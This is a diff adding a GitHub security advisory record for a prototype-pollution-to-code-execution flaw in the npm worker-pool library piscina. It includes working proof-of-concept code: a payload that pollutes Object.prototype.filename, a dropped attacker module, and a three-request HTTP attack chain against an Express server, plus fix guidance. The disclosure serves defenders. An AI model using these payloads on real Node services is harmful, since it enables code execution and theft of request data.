@@ -1,0 +1,102 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-x9g3-xrwr-cwfg",
+  "modified": "2026-06-18T13:05:11Z",
+  "published": "2026-06-18T13:05:11Z",
+  "aliases": [
+    "CVE-2026-55388"
+  ],
+  "summary": "piscina: Prototype Pollution Gadget → RCE via inherited options.filename",
+  "details": "## Summary\n\n`piscina`'s constructor and `run()` paths read the `filename` option via plain member access:\n\n```js\n// dist/index.js line 92 (constructor)\nconst filename = options.filename\n  ? (0, common_1.maybeFileURLToPath)(options.filename)\n  : null;\nthis.options = { ...kDefaultOptions, ...options, filename, maxQueue: 0 };\n\n// dist/index.js line 616 (run())\nrun(task, options = kDefaultRunOptions) {\n    if (options === null || typeof options !== 'object') {\n        return Promise.reject(new TypeError('options must be an object'));\n    }\n    const { transferList, filename, name, signal } = options;\n```\n\nBoth reads fall through the prototype chain when the caller's options object doesn't have `filename` as an own property. When `Object.prototype.filename` is polluted upstream — by any of the well-documented PP-source CVEs (lodash<4.17.13, qs<6.10.3, set-value<4.1.0, minimist<1.2.6, deepmerge<4.2.2, and others) — the inherited value flows to `worker_threads.Worker` import and the attacker's `.mjs` runs in the worker.\n\n**Subtlety**: calling `pool.run(task)` with no second arg uses `kDefaultRunOptions` which has `filename: null` as an OWN property — that path DOES NOT fire. The vulnerable shape is when the caller passes their own options object (commonly `{signal: ac.signal}` for abort support, `{name: ...}` for task labelling, etc.). These caller-built options objects inherit from `Object.prototype` unless the caller explicitly uses `Object.create(null)`.\n\n## Impact\n\nTwo preconditions:\n\n1. **Upstream PP-source** somewhere in the process — common in transitive deps\n2. **Attacker-controllable `.mjs`** at a known filesystem path — realistic via upload endpoints, /tmp races, predictable node_modules paths, or supply-chain\n\nOnce both fire:\n- Every `pool.run(task, opts)` call across the entire process is hijacked\n- Attacker's exported function is called with the legitimate caller's task data — **attacker reads per-request app data**\n- Attacker controls the return value — caller receives `worker_response.by = \"ATTACKER-WORKER\"` and any other attacker-supplied response fields — **attacker can poison return values to legitimate clients**\n- Hijack persists until process restart\n\nStrictly worse than the analogous pino chain because piscina actually *invokes* the attacker function with caller data on every dispatch (pino imports the attacker module once and errors out).\n\n## Affected versions\n\nEmpirically verified vulnerable on `piscina@5.1.4` (latest stable at time of disclosure). The bug shape is in the constructor's `options.filename` read at line 92 of `dist/index.js`, present since the worker-pool API stabilized — likely all 3.x / 4.x / 5.x affected.\n\n## Proof of concept\n\n### A) Minimal in-process PoC\n\n```js\nimport fs from 'fs';\n\n// 1) Drop the attacker module (any path the victim process can read)\nfs.writeFileSync('/tmp/atk.mjs', `\n  import fs from 'fs';\n  fs.writeFileSync('/tmp/PISCINA_RCE_SENTINEL', JSON.stringify({\n    rce: 'CONFIRMED', pid: process.pid, argv1: process.argv[1],\n  }));\n  export default function(arg) { return 'attacker-return-' + JSON.stringify(arg); }\n`);\n\n// 2) Upstream PP-source — pollute Object.prototype.filename\n//    (representative of CVE-2019-10744 lodash<4.17.13, CVE-2022-24999 qs<6.10.3,\n//     and ~30 historical PP-source CVEs)\nconst payload = JSON.parse('{\"__proto__\":{\"filename\":\"/tmp/atk.mjs\"}}');\nfunction vulnMerge(t, s) {\n  for (const k of Object.keys(s)) {\n    if (s[k] !== null && typeof s[k] === 'object') {\n      if (!t[k]) t[k] = {};\n      vulnMerge(t[k], s[k]);\n    } else t[k] = s[k];\n  }\n}\nvulnMerge({}, payload);\n\n// 3) Piscina with empty options inherits the polluted filename\nconst { Piscina } = await import('piscina');\nconst p = new Piscina({});                        // inherits filename\nconst result = await p.run({});                   // worker imports /tmp/atk.mjs\nawait p.destroy();\n\n// 4) sentinel exists; attacker fn was called with task data\nconsole.log(fs.readFileSync('/tmp/PISCINA_RCE_SENTINEL', 'utf8'));\nconsole.log('attacker fn returned:', result);\n// → \"attacker-return-{}\"\n```\n\n### B) Full-stack HTTP chain (this is the realistic shape)\n\nA correctly-initialized pool gets hijacked by attacker activity. Pool is created at server boot with a legitimate worker, then per-request handlers call `pool.run(req.body, {signal: ac.signal})` — the standard abort-aware shape.\n\n```js\n// === server.mjs ===\nimport express from 'express';\nimport { Piscina } from 'piscina';\n\n// Vulnerable PP-source middleware (lodash<4.17.13 equivalent)\nfunction vulnMerge(t, s) {\n  for (const k of Object.keys(s)) {\n    if (s[k] !== null && typeof s[k] === 'object') {\n      if (!t[k]) t[k] = {};\n      vulnMerge(t[k], s[k]);\n    } else t[k] = s[k];\n  }\n}\n\n// CORRECT pool init at boot\nconst pool = new Piscina({\n  filename: './valid-worker.mjs',\n  minThreads: 1, maxThreads: 2,\n});\n\nconst config = {};\nconst app = express();\n\napp.post('/api/settings', express.json(), (req, res) => {\n  vulnMerge(config, req.body);                    // PP source\n  res.json({ ok: true });\n});\n\napp.post('/api/process', express.json(), async (req, res) => {\n  const ac = new AbortController();\n  const result = await pool.run(req.body, { signal: ac.signal });  // <-- hijacked\n  res.json({ ok: true, worker_response: result });\n});\n\napp.listen(7755);\n\n// === Attacker, 3 HTTP requests ===\n// POST /upload  → drops /tmp/atk.mjs\n// POST /api/settings with body: {\"__proto__\":{\"filename\":\"/tmp/atk.mjs\"}}\n// POST /api/process → pool.run() destructures filename via prototype\n//                  → worker imports /tmp/atk.mjs\n//                  → attacker fn called with req.body of THIS request\n//                  → caller receives attacker-shaped response\n```\n\nEmpirical observation on `piscina@5.1.4` + Node 23.11.0:\n- Pre-attack `/api/process` returns `{by: 'valid-worker'}`\n- Cold-path `/probe` after PP source confirms `({}).filename` is polluted process-wide\n- Post-attack `/api/process` returns `{by: 'ATTACKER-WORKER', processed: <caller's exfil data>}`\n- Sentinel file written from inside `piscina/dist/worker.js` with the worker process's uid + env access\n\n## Recommended fix\n\nMinimal — own-property guard at both option-read sites:\n\n```js\n// constructor (line 92)\nconst userFilename = Object.prototype.hasOwnProperty.call(options, 'filename')\n  ? options.filename\n  : null;\nconst filename = userFilename\n  ? (0, common_1.maybeFileURLToPath)(userFilename)\n  : null;\n\n// run() (line 616)\nconst safeOpts = Object.create(null);\nObject.assign(safeOpts, options);          // copies own props only? — keeps shape\nconst { transferList, filename, name, signal } = safeOpts;\n```\n\nMore idiomatic — use a null-prototype working object throughout `this.options`:\n\n```js\nconst safeOpts = Object.create(null);\nObject.assign(safeOpts, kDefaultOptions, options);\nthis.options = safeOpts;\nthis.options.filename = safeOpts.filename\n  ? (0, common_1.maybeFileURLToPath)(safeOpts.filename)\n  : null;\nthis.options.maxQueue = 0;\n```\n\nEither approach closes the gadget without breaking any legitimate caller pattern.\n\nThe pattern is the same as recommended for axios CVE-2026-44494 and the pino PSA filed earlier today. Cross-fix consideration: any other library you maintain that uses similar `options.X` member-access for worker / child-process / module-load operations is worth a quick audit.\n\n## Coordination\n\n- Same maintainer as pino — you're already in security-triage mode for that PSA. Happy to coordinate timing / disclosure dates across both.\n- Will not share publicly until GHSA published or 90 days.\n- Please credit `ridingsa` if you choose to credit a reporter.\n\n## How this was discovered\n\nGeneralized the pino disclosure's mechanism — any library that reads a string option via plain member access and dynamic-loads it (via `import()` / `require()` / `new Worker()`) is a candidate. Ran a sweep across 10 candidate libraries; piscina + fastify (via pino propagation) fired. Piscina is independently vulnerable through its own option-read sites, hence this separate disclosure.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "piscina"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "5.0.0-alpha.0"
+            },
+            {
+              "fixed": "5.2.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 5.1.4"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "piscina"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "4.9.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "<= 4.9.2"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "piscina"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "6.0.0-rc.1"
+            },
+            {
+              "fixed": "6.0.0-rc.2"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/piscinajs/piscina/security/advisories/GHSA-x9g3-xrwr-cwfg"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/piscinajs/piscina"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-1321",
+      "CWE-94"
+    ],
+    "severity": "HIGH",
+    "github_reviewed": true,
+    "github_reviewed_at": "2026-06-18T13:05:11Z",
+    "nvd_published_at": null
+  }
+}
